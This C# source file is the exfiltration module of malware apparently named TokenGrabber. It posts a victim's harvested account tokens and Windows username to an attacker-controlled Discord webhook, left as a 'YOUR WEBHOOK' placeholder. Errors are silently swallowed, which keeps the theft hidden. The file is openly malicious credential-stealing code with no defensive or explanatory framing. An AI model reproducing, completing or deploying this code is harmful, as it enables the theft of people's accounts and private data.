using System;
using System.Collections.Generic;
using System.Net.Http;

namespace TokenGrabber
{
    public static class Webhook
    {
        private static readonly string _hookUrl = "YOUR WEBHOOK";


        public static void ReportTokens(List<string> tokenReport)
        {
            try
            {
                HttpClient client = new HttpClient();
                Dictionary<string, string> contents = new Dictionary<string, string>
                    {
                        { "content", $"Token report for computer: '{Environment.UserName}'\n\n{string.Join("\n", tokenReport)}" },
                        { "username", "Captain Hook" },
                        { "avatar_url", "https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png" }
                    };

                client.PostAsync(_hookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
            }
            catch { }
        }
    }
}
